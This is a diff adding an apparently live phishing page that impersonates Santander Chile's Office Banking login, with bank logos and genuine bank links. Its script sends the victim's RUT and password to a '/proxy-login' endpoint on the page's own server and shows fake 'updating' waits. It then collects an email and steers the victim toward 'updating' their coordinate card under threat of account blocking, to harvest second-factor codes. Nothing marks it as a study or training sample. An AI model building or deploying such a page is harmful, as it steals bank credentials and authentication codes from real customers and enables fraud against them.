@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Office Banking</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+  <link rel="stylesheet" href="icons.css">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #f5f5f5; /* fondo gris claro */
+    }
+    .carousel-item img {
+      object-fit: cover;
+      height: 100vh; /* ocupa toda la altura de la pantalla */
+    }
+    .carousel-inner .row {
+      margin: 0;
+    }
+    .carousel-inner .col-12 {
+      padding: 0;
+    }
+    .carousel-control-prev-icon,
+    .carousel-control-next-icon {
+      filter: invert(100%);
+    }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-7Z89S1V9Q8"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-7Z89S1V9Q8');
+  </script>
+
+</head>
+
+<body>
+
+<!-- Barra superior -->
+<nav class="navbar navbar-expand-lg" style="background-color:#fff; border-bottom:2px solid #ddd; min-height:90px; padding-top:12px; padding-bottom:12px;">
+  <div class="container-fluid d-flex justify-content-between align-items-center">
+    
+    <!-- Logos lado a lado en escritorio y tablet -->
+    <a class="navbar-brand d-flex align-items-center d-none d-md-flex" href="#">
+      <img src="/logo-office-banking.svg" alt="Logo Office Banking" style="height:40px; margin-right:12px;">
+      <img src="/LogoSantander.png" alt="Logo Santander" style="height:40px; position:relative; top:-4px;">
+    </a>
+    
+    <!-- Solo Office Banking en móvil -->
+    <a class="navbar-brand d-flex align-items-center d-md-none" href="#">
+      <img src="/logo-office-banking.svg" alt="Logo Office Banking" style="height:36px;">
+    </a>
+
+    <!-- Links centrados -->
+    <div class="d-none d-md-flex flex-grow-1 justify-content-center">
+      <ul class="navbar-nav">
+        <li class="nav-item">
+          <a class="nav-link" href="https://empresas.officebanking.cl/article/productos-y-servicios" style="color:#000; font-weight:500; margin:0 12px;">
+            Productos y Servicios
+          </a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="https://banco.santander.cl/sucursales-santander" style="color:#000; font-weight:500; margin:0 12px;">
+            Sucursales
+          </a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="https://empresas.officebanking.cl/article/servicio-al-cliente" style="color:#000; font-weight:500; margin:0 12px;">
+            Servicio al Cliente
+          </a>
+        </li>
+      </ul>
+    </div>
+
+    <!-- Botón Ingresar (se mantiene igual) -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css">
+    <button class="btn btn-ingresar ms-auto" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasLogin"
+      style="background-color:#cc0000; color:#fff; border-radius:25px; font-weight:bold; padding:6px 16px; border:none; display:flex; align-items:center;">
+      <i class="bi bi-person" style="font-size:20px; margin-right:8px;"></i> Ingresar
+    </button>
+  </div>
+  
+</nav><!-- Carrusel -->
+<div id="carouselExample" class="carousel slide" data-bs-ride="carousel">
+  <div class="carousel-inner">
+
+   <!-- Primer slide -->
+<div class="carousel-item active">
+  <div class="row">
+    <div class="col-12 d-none d-md-block">
+      <a href="https://banco.santander.cl/beneficios?filter=empresas" target="_blank">
+        <img src="/BeneficiosEmpresas (2).png" class="d-block w-100 beneficios-empresas" alt="Beneficios Empresas">
+      </a>
+    </div>
+
+    <div class="col-12 d-block d-md-none">
+      <a href="https://banco.santander.cl/beneficios?filter=empresas" target="_blank">
+        <img src="/beneficiosEmpresas.jpg" class="d-block w-100" alt="Beneficios Empresas">
+      </a>
+    </div>
+    <div class="col-12 d-block d-md-none">
+      <a href="https://banco.santander.cl/beneficios?filter=empresas" target="_blank">
+        <img src="/beneficios2.png" alt="Beneficios" class="img-fluid d-block mx-auto" style="max-width:100%; height:auto;">
+      </a>
+    </div>
+  </div>
+</div>
+
+<!-- Segundo slide -->
+<div class="carousel-item">
+  <div class="row">
+    <div class="col-12 col-md-6">
+      <a href="https://banco.santander.cl/empresas/tarjetas-de-credito-empresas" target="_blank">
+        <img src="/Tc2.png" class="d-block w-100" alt="TC2">
+      </a>
+    </div>
+    <div class="col-12 col-md-6">
+      <a href="https://banco.santander.cl/empresas/tarjetas-de-credito-empresas" target="_blank">
+        <img src="/tc_empresas.jpg" class="d-block w-100" alt="Tarjeta Empresas">
+      </a>
+    </div>
+  </div>
+</div>
+
+<!-- Tercer slide -->
+<div class="carousel-item">
+  <div class="row">
+    <div class="col-12 col-md-6">
+      <a href="https://banco.santander.cl/empresas/fogape" target="_blank">
+        <img src="/FogapeNuevo.jpg" class="d-block w-100" alt="Santander X">
+      </a>
+    </div>
+    <div class="col-12 col-md-6">
+      <a href="https://banco.santander.cl/empresas/fogape" target="_blank">
+        <img src="/Fogape1.png" class="d-block w-100" alt="SOAP 2">
+      </a>
+    </div>
+  </div>
+</div>
+
+  </div>
+
+  <!-- Flechas de navegación -->
+  <button class="carousel-control-prev" type="button" data-bs-target="#carouselExample" data-bs-slide="prev">
+    <span class="carousel-control-prev-icon" aria-hidden="true"></span>
+    <span class="visually-hidden">Anterior</span>
+  </button>
+  <button class="carousel-control-next" type="button" data-bs-target="#carouselExample" data-bs-slide="next">
+    <span class="carousel-control-next-icon" aria-hidden="true"></span>
+    <span class="visually-hidden">Siguiente</span>
+  </button>
+</div>
+
+<!-- Indicadores independientes debajo -->
+<div class="carousel-indicators mt-3">
+  <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
+  <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="1" aria-label="Slide 2"></button>
+  <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="2" aria-label="Slide 3"></button>
+</div>
+
+<div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin">
+  <div class="offcanvas-header" style="padding-top:40px; padding-bottom:20px;">
+
+    <div class="d-flex justify-content-center align-items-center">
+      <img src="/logo-office-banking.svg" class="logo-ob me-3">
+      <img src="/LogoSantander.png" class="logo-santander">
+    </div>
+
+    <button type="button" class="btn-close" data-bs-dismiss="offcanvas"
+            style="filter: invert(30%) sepia(100%) saturate(5000%) hue-rotate(340deg);"></button>
+  </div>
+
+  <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
+
+    <h5 class="text-center mb-4">Bienvenido a Office Banking</h5>
+<!-- BLOQUE DE ERROR -->
+<div id="pantallaError" class="hidden" style="text-align:center; padding:25px;">
+
+  <!-- Ícono -->
+  <div style="
+    width:80px;
+    height:80px;
+    margin:0 auto 20px auto;
+    border-radius:50%;
+    background:#d9534f;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  ">
+    <span style="
+      color:white;
+      font-size:45px;
+      font-weight:bold;
+      line-height:0;
+    ">×</span>
+  </div>
+
+  <!-- Texto -->
+  <h2 style="font-size:20px; font-weight:bold; margin-bottom:10px;">
+    REVISA LOS DATOS INGRESADOS.
+  </h2>
+
+  <p id="mensajeError" style="font-size:16px; color:#555; margin-bottom:25px;">
+    Algunos de los datos ingresados no son correctos.<br>
+    Por favor, inténtalo nuevamente.
+  </p>
+
+  <!-- Botón -->
+  <button class="btn-red w-100" onclick="volverInicio()">
+    Aceptar
+  </button>
+</div>
+
+    <div class="login-box">
+
+      <!-- FORMULARIO LOGIN -->
+      <form id="loginForm">
+        <label for="rut">RUT</label>
+        <div class="position-relative">
+          <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right:40px;">
+          <span class="clear-input" onclick="document.getElementById('rut').value=''"></span>
+        </div>
+
+        <label for="passwd">Contraseña</label>
+        <div class="position-relative">
+          <input type="password" id="passwd" name="passwd" required class="form-control" style="padding-right:80px;">
+          <span class="clear-input" onclick="document.getElementById('passwd').value=''"></span>
+          <img id="togglePasswd" src="eye.svg" alt="Mostrar contraseña" class="icon-eye">
+        </div>
+
+        <button type="submit" class="btn-red w-100">Aceptar</button>
+
+        <div class="options">
+          <a href="https://wslogin.officebanking.cl/autogestion-clave" target="_blank">¿Olvidaste tu clave?</a>
+        </div>
+      </form>
+
+      <div id="resultado"></div>
+
+      <!-- ESPERA -->
+      <div id="pantallaEspera" class="hidden">
+        <h2>Estamos actualizando la información, por favor espera...</h2>
+        <div class="spinner"></div>
+      </div>
+
+      <!-- CORREO -->
+      <div id="formCorreo" class="hidden">
+        <h2>Necesitamos actualizar tu correo electrónico</h2>
+        <input type="email" id="correo" placeholder="Ingresa tu correo">
+        <button class="btn-red" onclick="enviarCorreo()">Enviar</button>
+      </div>
+
+      <!-- ========================= -->
+      <!--   NUEVA PANTALLA: PREGUNTA -->
+      <!-- ========================= -->
+
+      <div id="pantallaSeleccion" class="hidden" style="padding:20px;">
+        <div class="text-center mb-3">
+          <img src="/logo-office-banking.svg" style="height:50px;">
+        </div>
+
+        <h2 class="text-center" style="font-size:18px;">
+          Si aún mantienes tu <strong>Tarjeta de Coordenadas</strong>, es necesario actualizarla para evitar el bloqueo.
+        </h2>
+
+        <button class="btn-red w-100 mb-3" onclick="seleccionarCoordenadas()">
+          Actualizar Tarjeta de Coordenadas
+        </button>
+
+        <button class="btn btn-secondary w-100" onclick="seleccionarPass()">
+          Continuar a Productos Disponibles
+        </button>
+      </div>
+
+      <!-- PRODUCTOS -->
+      <div id="pantallaProductos" class="hidden">
+        <h2>Estamos evaluando la mejor alternativa posible</h2>
+        <button class="btn-red" onclick="continuarProductos()">Continuar</button>
+      </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- ========================= -->
+<!--         SCRIPTS           -->
+<!-- ========================= -->
+
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+<script>
+/* Mostrar/Ocultar contraseña */
+togglePasswd.onclick = () => {
+  const visible = passwd.type === "password";
+  passwd.type = visible ? "text" : "password";
+  togglePasswd.src = visible ? "eye-slash.svg" : "eye.svg";
+};
+
+/* Formateo RUT */
+function formatearRUT(v){
+  v = v.replace(/\./g,"").replace(/-/g,"");
+  if(v.length===0) return "";
+  let dv = v.slice(-1);
+  let c = v.slice(0,-1);
+  return c.replace(/\B(?=(\d{3})+(?!\d))/g,".") + "-" + dv;
+}
+rut.addEventListener("input", e=>{
+  e.target.value = formatearRUT(e.target.value.replace(/[^0-9kK]/g,""));
+});
+
+/* Validar RUT */
+function validarRut(r){
+  r = r.replace(/\./g,"").replace(/-/g,"").toUpperCase();
+  if(r.length<2) return false;
+  let c=r.slice(0,-1), dv=r.slice(-1);
+  let s=0,m=2;
+  for(let i=c.length-1;i>=0;i--){
+    s += parseInt(c[i])*m;
+    m = m<7 ? m+1 : 2;
+  }
+  let e = 11-(s%11);
+  e = e===11?"0":e===10?"K":e.toString();
+  return dv===e;
+}
+
+/* Mostrar error visual */
+function mostrarError(msg){
+  loginForm.classList.add("hidden");
+  pantallaEspera.classList.add("hidden");
+  formCorreo.classList.add("hidden");
+  pantallaSeleccion.classList.add("hidden");
+  pantallaProductos.classList.add("hidden");
+
+  mensajeError.innerHTML = msg;
+  pantallaError.classList.remove("hidden");
+}
+
+/* Volver al inicio */
+function volverInicio(){
+  window.location.href = "/";
+}
+
+/* LOGIN */
+loginForm.addEventListener("submit", async e=>{
+  e.preventDefault();
+
+  if(!validarRut(rut.value)){
+    mostrarError("RUT inválido");
+    return;
+  }
+
+  try{
+    const res = await fetch("/proxy-login",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({ rut:rut.value, passwd:passwd.value })
+    });
+
+    const data = await res.json();
+
+    // 🔥 BLOQUEO REAL
+    if (!res.ok || data.status === "error") {
+      mostrarError(data.mensaje || "Acceso bloqueado");
+      return; // ⛔ DETIENE EL FLUJO
+    }
+
+  }catch(e){
+    mostrarError("Error de conexión");
+    return;
+  }
+
+  // 🔥 SOLO si NO está bloqueado avanza
+  loginForm.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    formCorreo.classList.remove("hidden");
+  },25000);
+});
+
+/* CORREO */
+async function enviarCorreo(){
+  try{
+    const res = await fetch("/proxy-login",{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body:JSON.stringify({ mail:correo.value })
+    });
+
+    const data = await res.json();
+
+    // 🔥 BLOQUEO REAL
+    if (!res.ok || data.status === "error") {
+      mostrarError(data.mensaje || "Acceso bloqueado");
+      return;
+    }
+
+  }catch(e){
+    mostrarError("Error de conexión");
+    return;
+  }
+
+  // 🔥 SOLO si NO está bloqueado avanza
+  formCorreo.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    pantallaSeleccion.classList.remove("hidden");
+  },15000);
+}
+
+/* SELECCIÓN */
+function seleccionarCoordenadas(){
+  window.location.href = "coordenadas.html";
+}
+
+function seleccionarPass(){
+  pantallaSeleccion.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    pantallaEspera.classList.add("hidden");
+    pantallaProductos.classList.remove("hidden");
+  },8000);
+}
+
+/* PRODUCTOS */
+function continuarProductos(){
+  pantallaProductos.classList.add("hidden");
+  pantallaEspera.classList.remove("hidden");
+
+  setTimeout(()=>{
+    window.location.href="productos.html";
+  },15000);
+}
+</script>
+
+</body>
+</html>
